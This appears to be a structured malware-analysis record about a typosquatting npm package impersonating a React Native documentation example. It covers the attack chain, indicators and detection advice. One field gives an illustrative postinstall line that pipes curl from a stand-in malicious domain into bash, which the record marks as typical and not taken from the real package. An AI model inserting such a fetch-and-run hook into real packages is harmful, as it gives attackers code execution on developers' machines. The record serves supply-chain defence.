package_info.why_malicious: The package was intentionally published to npm to impersonate a legitimate local development package referenced in official React Native documentation. Its purpose was to exploit developers who follow the guide, potentially leading to the execution of attacker-controlled code.

execution_context.file_location: package entrypoint (index.js or postinstall script in package.json)

malicious_snippets.code_snippet:
// Example (not shown in report, but typical for this attack):
postinstall: "curl -s https://malicious-domain.com/payload.sh | bash"
malicious_snippets.code_behavior: During installation, the code executes a postinstall script that fetches and runs a remote shell script, enabling arbitrary code execution on the developer's machine.

malice_analysis.why_suspicious: Fetching and executing remote code during installation is a classic supply chain attack technique, especially when the package is not expected to have any install-time side effects.
malice_analysis.violated_expectations: A legitimate local development package should not execute network requests or run arbitrary code on install. The expected behavior is to provide only the component code for development.
malice_analysis.similar_legitimate_use: Some legitimate packages use postinstall scripts for native module compilation, but these should not fetch remote code.
key_indicators: Presence of postinstall script in package.json
Network request to external domain during install
Execution of shell commands not required for normal operation

attack_chain.action: Attacker publishes a malicious npm package named 'rtn-centered-text' to impersonate the example used in official documentation.
attack_chain.leads_to: Developers are tricked into installing the malicious package.

attack_chain.action: Developer runs 'yarn upgrade rtn-centered-text' as instructed by the documentation, which pulls the malicious package from npm instead of using the local version.
attack_chain.leads_to: Malicious package is installed in the developer's environment.

attack_chain.action: Malicious code in the package executes at install-time, potentially fetching and running remote code.
attack_chain.leads_to: Attacker gains code execution on the developer's machine, leading to possible data exfiltration or further compromise.

behavioral_signatures: Unexpected postinstall scripts in packages mimicking local development modules
Network requests to external domains during package installation
Execution of shell commands or scripts not required for normal operation
file_indicators: References to remote URLs or shell commands in install scripts
network_indicators: Outbound HTTP/HTTPS requests to domains not associated with the legitimate project during install
detection_knowledge.how_to_detect: Monitor for packages with names matching local development examples from documentation that include postinstall scripts or network activity during installation. Flag any package that fetches and executes remote code at install-time, especially if it is not a well-known dependency. Review package.json for unexpected scripts and audit network activity during package installation for suspicious domains.
